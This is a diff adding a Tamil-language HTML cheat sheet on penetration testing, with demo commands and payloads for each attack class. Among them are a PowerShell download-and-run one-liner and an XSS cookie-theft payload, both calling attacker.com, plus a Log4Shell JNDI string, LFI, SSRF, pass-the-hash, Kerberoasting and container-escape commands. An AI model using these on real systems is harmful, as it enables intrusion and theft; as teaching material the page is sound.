@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="ta">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking & Pentesting Master Book with Commands</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            line-height: 1.7;
+            color: #2c3e50;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: #38bdf8;
+            padding: 40px 20px;
+            text-align: center;
+            border-bottom: 5px solid #0ea5e9;
+        }
+        header h1 { margin: 0; color: #fff; font-size: 2.2em; }
+        header p { color: #94a3b8; font-size: 1.1em; margin-top: 10px; }
+        .container {
+            max-width: 1100px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        .nav-box {
+            background: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            margin-bottom: 40px;
+        }
+        .nav-box h2 { margin-top: 0; color: #0f172a; border-bottom: 2px solid #38bdf8; padding-bottom: 10px; }
+        .nav-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+        .nav-grid a {
+            color: #334155;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 10px;
+            background: #f8fafc;
+            border-radius: 4px;
+            transition: 0.3s;
+            border-left: 4px solid #38bdf8;
+        }
+        .nav-grid a:hover {
+            background: #0ea5e9;
+            color: white;
+            transform: translateX(5px);
+        }
+        h2.section-title {
+            background: #0f172a;
+            color: #fff;
+            padding: 15px 20px;
+            border-radius: 5px;
+            margin-top: 50px;
+            border-left: 8px solid #ef4444;
+        }
+        .attack-card {
+            background: #fff;
+            padding: 25px;
+            margin: 25px 0;
+            border-radius: 6px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border-left: 4px solid #f59e0b;
+        }
+        .attack-card h3 {
+            margin-top: 0;
+            color: #ef4444;
+            font-size: 1.4em;
+        }
+        .sub-attack {
+            margin-left: 20px;
+            padding: 10px 0;
+            border-bottom: 1px dashed #e2e8f0;
+        }
+        .sub-attack strong { color: #1e293b; }
+        .code-block {
+            background: #1e293b;
+            color: #38bdf8;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin-top: 10px;
+            border-left: 4px solid #f59e0b;
+        }
+        .cmd-block {
+            background: #0f172a;
+            color: #34d399;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin-top: 10px;
+            border-left: 4px solid #ef4444;
+        }
+        .badge {
+            background: #ef4444;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .badge-safe { background: #10b981; }
+        .badge-cmd { background: #6366f1; }
+        footer {
+            text-align: center;
+            padding: 40px;
+            background: #0f172a;
+            color: #94a3b8;
+            margin-top: 60px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>எத்திகல் ஹேக்கிங் & பென்டெஸ்டிங் பிராக்டிகல் மாஸ்டர் புக்</h1>
+        <p>215 தாக்குதல்களின் விளக்கம், டெமோ கட்டளைகள் (Demo Commands) மற்றும் தற்காப்பு முறைகள்</p>
+    </header>
+
+    <div class="container">
+
+        <!-- Table of Contents Index -->
+        <div class="nav-box">
+            <h2>தாக்குதல் பிரிவுகள் (Attack Modules)</h2>
+            <div class="nav-grid">
+                <a href="#sec-injection">1. Injection Attacks</a>
+                <a href="#sec-code-exec">2. Code Execution Attacks</a>
+                <a href="#sec-file-based">3. File-Based Attacks</a>
+                <a href="#sec-web-app">4. Web Application Attacks</a>
+                <a href="#sec-infrastructure">5. Infrastructure & System</a>
+                <a href="#sec-ad-cloud">6. Active Directory & Cloud</a>
+                <a href="#sec-advanced-api">7. API & Advanced Flaws</a>
+            </div>
+        </div>
+
+        <!-- SECTION 1: INJECTION ATTACKS -->
+        <h2 id="sec-injection" class="section-title">1. இன்ஜெக்ஷன் தாக்குதல்கள் (Injection Attacks)</h2>
+        
+        <div class="attack-card">
+            <h3>SQL Injection (SQLi)</h3>
+            <p>வலைப்பக்கத்தின் உள்ளீடுகள் மூலம் தீங்கிழைக்கும் SQL குறியீடுகளை புகுத்தி தரவுத்தளத்தை கட்டுப்படுத்துதல்.</p>
+            <div class="sub-attack"><strong>Error-based / Union-based / Blind / Time-based / Out-of-band:</strong> தரவுத்தளத்தின் பதில்கள் மற்றும் நேர தாமதங்களை வைத்து தகவல்களை திருடுவது.</div>
+            
+            <span class="badge badge-cmd">Demo Command (sqlmap):</span>
+            <pre class="cmd-block"># தானியங்கி முறையில் தரவுத்தளத்தை கண்டறிய
+sqlmap -u "http://target.com/item.php?id=1" --dbs --batch</pre>
+
+            <span class="badge badge-safe">பாதுகாப்பான குறியீடு (Remediation) - PHP PDO:</span>
+            <pre class="code-block"><code>$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
+$stmt->execute(['id' => $userInput]);</code></pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Command Injection & Argument Injection</h3>
+            <p><strong>OS Command Injection:</strong> வெப் அப்ளிகேஷன் வழியாக சர்வரின் ஆப்பரேட்டிங் சிஸ்டம் கட்டளைகளை இயக்குவது.</p>
+            <p><strong>Argument Injection:</strong> ஏற்கனவே இயங்கும் ஒரு பயன்பாட்டின் அர்குமெண்டுகளை (Flags) மாற்றி அமைப்பது.</p>
+            
+            <span class="badge badge-cmd">Demo Payload (Web Input Box):</span>
+            <pre class="cmd-block">; cat /etc/passwd # அல்லது விண்டோஸில் & whoami</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Template & Language Injections (SSTI, CSTI, EL, LDAP, XPath, NoSQL)</h3>
+            <p>டெம்ப்ளேட் எஞ்சின்கள் (SSTI), எக்ஸ்பிரஷன் லாங்குவேஜ்கள் (SpEL), மற்றும் NoSQL (MongoDB) போன்ற கட்டமைப்புகளில் உள்ளீடுகளை மாற்றுவது.</p>
+            <span class="badge badge-cmd">NoSQL Login Bypass Payload:</span>
+            <pre class="cmd-block">{"username": {"$gt": ""}, "password": {"$gt": ""}}</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Log4Shell (CVE-2021-44228) & Spring4Shell</h3>
+            <p>ஜாவா லாகிங் லைப்ரரிகளில் (Log4j) உள்ள குறைபாட்டை பயன்படுத்தி RCE பெறுவது.</p>
+            <span class="badge badge-cmd">Demo Payload (User-Agent or Input):</span>
+            <pre class="cmd-block">${jndi:ldap://attacker.com/exploit}</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>CRLF, Header, IMAP, SMTP, OGNL, JNDI, SSI Injection</h3>
+            <p>மின்னஞ்சல் நெறிமுறைகள் மற்றும் சர்வர் ஹெடர்களில் <code>\r\n</code> குறியீடுகளை புகுத்தி ஏமாற்றுவது.</p>
+        </div>
+
+
+        <!-- SECTION 2: CODE EXECUTION ATTACKS -->
+        <h2 id="sec-code-exec" class="section-title">2. குறியீடு இயக்குதல் தாக்குதல்கள் (Code Execution Attacks)</h2>
+
+        <div class="attack-card">
+            <h3>Remote Code Execution (RCE) & Local Code Execution (LCE)</h3>
+            <p>சர்வரில் தன்னிச்சையான கோப்புகளையோ அல்லது கணினி கட்டளைகளையோ தூரத்திலிருந்து இயக்குவது.</p>
+            <span class="badge badge-cmd">Demo Command (Netcat Reverse Shell Listener):</span>
+            <pre class="cmd-block">nc -lvnp 4444</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Deserialization & Dynamic Code Execution</h3>
+            <p><strong>Deserialization (Java, .NET, PHP, Python Pickle, Ruby Marshal):</strong> பைட்டுகளாக இருக்கும் ஆப்ஜெக்ட்டுகளை மீண்டும் மாற்றும்போது மால்வேர்களை இயக்குவது.</p>
+            <span class="badge badge-cmd">Demo Command (ysoserial for Java Deserialization):</span>
+            <pre class="cmd-block">java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Script-based Execution & Interpreter Abuse</h3>
+            <p>கணினியில் இருக்கும் <strong>PowerShell, Bash, VBScript, JScript, Python, Perl, Ruby</strong> போன்ற இன்டர்பிரெட்டர்களை ஹேக்கர்கள் பயன்படுத்துவது.</p>
+            <span class="badge badge-cmd">Demo Command (PowerShell One-Liner):</span>
+            <pre class="cmd-block">powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Memory Corruption (Buffer/Heap/Stack Overflow, UAF, ROP, JOP, Format String)</h3>
+            <p>C/C++ மொழிகளில் எழுதப்பட்ட மென்பொருள்களின் நினைவகத்தை (Memory) சிதைத்து சிஸ்டத்தை கைப்பற்றுவது.</p>
+            <span class="badge badge-cmd">Demo Pattern (Buffer Overflow Fuzzing):</span>
+            <pre class="cmd-block">python3 -c "print('A' * 1000)" | ./vulnerable_program</pre>
+        </div>
+
+
+        <!-- SECTION 3: FILE-BASED ATTACKS -->
+        <h2 id="sec-file-based" class="section-title">3. கோப்பு சார்ந்த தாக்குதல்கள் (File-Based Attacks)</h2>
+
+        <div class="attack-card">
+            <h3>Malicious Office Macros (VBA, XLM 4.0, DDE), RTF & PDF Exploits</h3>
+            <p>வேர்ட், எக்செல் அல்லது பிடிஎஃப் கோப்புகளை திறக்கும்போது பின்னணியில் மால்வேர்களை இயங்க வைப்பது.</p>
+        </div>
+
+        <div class="attack-card">
+            <h3>LNK, CHM, HTA Abuse, Zip Slip, Zip Bomb, Polyglots, Steganography, ADS</h3>
+            <p><strong>Zip Slip:</strong> அன்சிப் செய்யும்போது கோப்புகளை தவறான பாதையில் எழுத வைப்பது.</p>
+            <p><strong>Alternate Data Streams (ADS):</strong> விண்டோஸில் ஒரு சாதாரண டெக்ஸ்ட் கோப்பிற்கு பின்னால் மால்வேரை ஒளித்து வைப்பது.</p>
+            <span class="badge badge-cmd">Demo Command (Windows ADS Creation):</span>
+            <pre class="cmd-block">type malware.exe > normal.txt:hidden.exe</pre>
+        </div>
+
+
+        <!-- SECTION 4: WEB APPLICATION ATTACKS -->
+        <h2 id="sec-web-app" class="section-title">4. வலைப்பக்க தாக்குதல்கள் (Web Application Attacks)</h2>
+
+        <div class="attack-card">
+            <h3>Cross-Site Scripting (XSS)</h3>
+            <p><strong>Reflected / Stored / DOM / mXSS / Blind XSS:</strong> பயனர்களின் பிரௌசர்களில் தீங்கிழைக்கும் ஜாவாஸ்கிரிப்ட் குறியீடுகளை இயக்குவது.</p>
+            <span class="badge badge-cmd">Demo Payload:</span>
+            <pre class="cmd-block">&lt;script&gt;fetch('http://attacker.com/log?c=' + document.cookie)&lt;/script&gt;</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>CSRF & Server-Side Request Forgery (SSRF)</h3>
+            <p><strong>SSRF to IMDS:</strong> கிளவுட் சர்வர் மூலமாக அதன் உள்வட்ட கிளவுட் மெட்டாடேட்டாவை திருடுதல்.</p>
+            <span class="badge badge-cmd">Demo SSRF Payload (Targeting AWS Metadata):</span>
+            <pre class="cmd-block">http://target.com/preview?url=http://169.254.169.254/latest/meta-data/</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Path Traversal, LFI, RFI & File Upload Bypass</h3>
+            <p><strong>LFI:</strong> சர்வரில் உள்ள உள்வட்ட கோப்புகளை இணையதளம் வழியாக வாசிப்பது.</p>
+            <span class="badge badge-cmd">Demo LFI Payload:</span>
+            <pre class="cmd-block">http://target.com/page.php?file=../../../../etc/passwd</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>IDOR, Broken Access Control, Authentication, Session Fixation</h3>
+            <p>அணுகல் கட்டுப்பாட்டு தவறுகளை பயன்படுத்தி பிற பயனர்களின் கணக்குகளை முடக்குவது.</p>
+        </div>
+
+        <div class="attack-card">
+            <h3>Niche Web Attacks (Cache Poisoning, Prototype Pollution, Dependency Confusion, Clickjacking, CORS, JWT, GraphQL, WebSockets)</h3>
+            <p>நவீன வலைப்பக்க கட்டமைப்புகளான ஜேடபிள்யூடி (JWT), கிராப்கியூஎல் (GraphQL) மற்றும் வெப்சாக்கெட்டுகளில் நடக்கும் மேம்பட்ட தாக்குதல்கள்.</p>
+        </div>
+
+
+        <!-- SECTION 5: INFRASTRUCTURE & SYSTEM ATTACKS -->
+        <h2 id="sec-infrastructure" class="section-title">5. உள்கட்டமைப்பு மற்றும் கணினி தாக்குதல்கள் (Infrastructure & System)</h2>
+
+        <div class="attack-card">
+            <h3>Process Injection (DLL, PE, Process Hollowing, Thread Hijacking, APC, AtomBombing)</h3>
+            <p>பாதுகாப்பான ஒரு கணினி ப்ராசஸிற்குள் மால்வேர் குறியீடுகளை உட்செலுத்தி ஆன்டிவைரஸை ஏமாற்றுவது.</p>
+        </div>
+
+        <div class="attack-card">
+            <h3>Living-off-the-Land (LOLBAS / GTFOBins)</h3>
+            <p>கணினியில் ஏற்கனவே இருக்கும் நம்பகமான டூல்களை தவறாக பயன்படுத்துவது.</p>
+            <span class="badge badge-cmd">Demo Command (GTFOBins - SUID Privilege Escalation via 'less'):</span>
+            <pre class="cmd-block">less /etc/passwd
+!/bin/sh # less-க்குள் இருந்து ரூட் ஷெல் பெறுவது</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Privilege Escalation, Persistence & Lateral Movement</h3>
+            <p><strong>Pass-the-Hash (PtH):</strong> பாஸ்வேர்டு இல்லமால் அதன் ஹாஷ்-ஐ மட்டும் வைத்து நெட்வொர்க்கில் உள்ள பிற கணினிகளுக்குள் நுழைவது.</p>
+            <span class="badge badge-cmd">Demo Command (CrackMapExec PtH):</span>
+            <pre class="cmd-block">crackmapexec smb 192.168.1.0/24 -u Administrator -H "admin_ntlm_hash_here"</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Defense Evasion, Discovery, Collection, Exfiltration, C2, Supply Chain, Hardware</h3>
+            <p><strong>Timestomping:</strong> கோப்புகளின் தேதியை மாற்றுவது. <strong>DNS Tunneling:</strong> டிஎன்எஸ் கோரிக்கைகள் வழியாக நிறுவனத்தின் ரகசிய தரவுகளை வெளியே கடத்துவது (Exfiltration).</p>
+        </div>
+
+
+        <!-- SECTION 6: ACTIVE DIRECTORY & CLOUD ATTACKS -->
+        <h2 id="sec-ad-cloud" class="section-title">6. ஆக்டிவ் டைரக்டரி மற்றும் கிளவுட் தாக்குதல்கள் (Active Directory & Cloud)</h2>
+
+        <div class="attack-card">
+            <h3>Active Directory (Kerberoasting, AS-REP Roasting, DCSync, LSASS Dumping)</h3>
+            <p>விண்டோஸ் ஆக்டிவ் டைரக்டரி நெட்வொர்க்கை முழுமையாக கைப்பற்றுதல்.</p>
+            <span class="badge badge-cmd">Demo Command (Impacket Kerberoasting):</span>
+            <pre class="cmd-block">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 domain.local/user</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>ADCS Abuse (ESC1 to ESC8) & Certifried</h3>
+            <p>Active Directory Certificate Services-ல் உள்ள தவறான உள்ளமைவுகளை பயன்படுத்தி டொமைன் அட்மினாக மாறுவது.</p>
+        </div>
+
+        <div class="attack-card">
+            <h3>Cloud & Container Escape (Docker, Kubernetes Abuse)</h3>
+            <p>டாக்கர் கன்டெய்னரில் இருந்து நிஜ சர்வர் ஹோஸ்டிற்குள் தப்பிப்பது.</p>
+            <span class="badge badge-cmd">Demo Command (Docker Socket Escape Check):</span>
+            <pre class="cmd-block">docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host</pre>
+        </div>
+
+
+        <!-- SECTION 7: API & ADVANCED FLAWS -->
+        <h2 id="sec-advanced-api" class="section-title">7. ஏபிஐ மற்றும் மேம்பட்ட குறைபாடுகள் (API & Advanced Flaws)</h2>
+
+        <div class="attack-card">
+            <h3>API Attacks (BOLA, BFLA, Rate Limit Bypass, SAML, XML Wrapping)</h3>
+            <p><strong>BOLA / IDOR:</strong> ஏபிஐ கோரிக்கைகளில் ஐடிகளை மாற்றி பிற பயனர் தரவை எடுத்தல்.</p>
+            <span class="badge badge-cmd">Demo API Request Modification:</span>
+            <pre class="cmd-block">GET /api/v1/profile?user_id=1002 HTTP/1.1 # 1001 லிருந்து 1002 ஆக மாற்றுதல்</pre>
+        </div>
+
+        <div class="attack-card">
+            <h3>Race Condition, Business Logic Flaws, DevOps (CI/CD Poisoning, Secrets in IaC)</h3>
+            <p><strong>TOCTOU / Race Condition:</strong> ஒரே மில்லிசெகண்டில் இரண்டு கோரிக்கைகளை அனுப்பி பணப்பரிமாற்றம் அல்லது கூப்பன்களை இருமுறை பயன்படுத்துவது.</p>
+            <p><strong>CI/CD Pipeline Poisoning:</strong> GitHub Actions கோப்புகளில் <code>repository_dispatch</code> அல்லது மலீசியஸ் புல் ரிக்வெஸ்ட் மூலம் சீக்ரெட் கீகளை திருடுவது.</p>
+        </div>
+
+    </div>
+
+    <footer>
+        <p>© 2026 எத்திகல் ஹேக்கிங் தமிழ் பிராக்டிகல் கலைக்களஞ்சியம். கல்வி மற்றும் பாதுகாப்பு ஆராய்ச்சிக்காக மட்டுமே.</p>
+    </footer>
+
+</body>
+</html>
